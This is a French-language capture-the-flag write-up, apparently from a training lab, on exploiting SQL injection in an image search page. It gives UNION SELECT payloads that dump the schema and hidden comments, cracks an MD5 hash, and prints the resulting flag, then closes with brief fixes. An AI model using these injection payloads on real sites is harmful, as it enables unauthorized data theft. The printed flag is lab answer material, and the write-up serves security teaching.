# SQL Injection - Image Search Data Extraction

## Description
Cette vulnérabilité exploite une injection SQL sur une page de recherche d'images.

## Exploitation

### Étape 1: Reconnaissance préalable
En utilisant la requête SQL découverte précédemment sur la page member, nous avons identifié la structure de la base de données :

```sql
1 UNION SELECT table_name, column_name FROM information_schema.columns;
```

Cette analyse révèle l'existence de la table `list_images` avec les colonnes suivantes :
- `id`
- `url`
- `title`
- `comment`

### Étape 2: Analyse du comportement de l'application
La page de recherche d'images permet de rechercher une image par ID et retourne :
- **ID** : L'identifiant saisi
- **Title** : Le titre de l'image
- **URL** : L'adresse de l'image

**Information manquante** : Le champ `comment` n'est pas affiché dans l'interface utilisateur normale.

### Étape 4: Extraction des commentaires cachés

Par déduction logique, nous déterminons que nous sommes déjà connectés à la base de données contenant la table `list_images`, car la recherche par ID fonctionne directement.

Nous utilisons une injection SQL pour révéler tous les commentaires des images :

```sql
1 UNION SELECT id, comment FROM list_images;
```

Cette requête nous permet d'associer chaque ID d'image à son commentaire caché.

### Étape 5: Découverte du message crucial de déchiffrement
Parmi les résultats, la dernière image révèle un commentaire particulièrement intéressant :

```text
ID: [dernière_image]
Comment: "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
```
Le commentaire nous donne des instructions claires et un hash MD5 à déchiffrer :

1. **Hash MD5 à déchiffrer** : `1928e8083cf461a51303633093573c46`
2. **Instructions** : MD5 decode → lowercase → SHA256

**Processus de déchiffrement :**

1. **Déchiffrement MD5** :
   ```
   1928e8083cf461a51303633093573c46 → "albatroz"
   ```

2. **Vérification (déjà en minuscules)** :
   ```
   "albatroz" (déjà en lowercase)
   ```

3. **Hachage SHA256** :
   ```bash
   echo -n "albatroz" | sha256sum
   # Résultat: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
   ```

### Solutions immédiates :
1. **Validation stricte** : Valider tous les paramètres d'entrée
2. **Contrôle d'accès** : Ne pas stocker d'informations sensibles dans la base de données
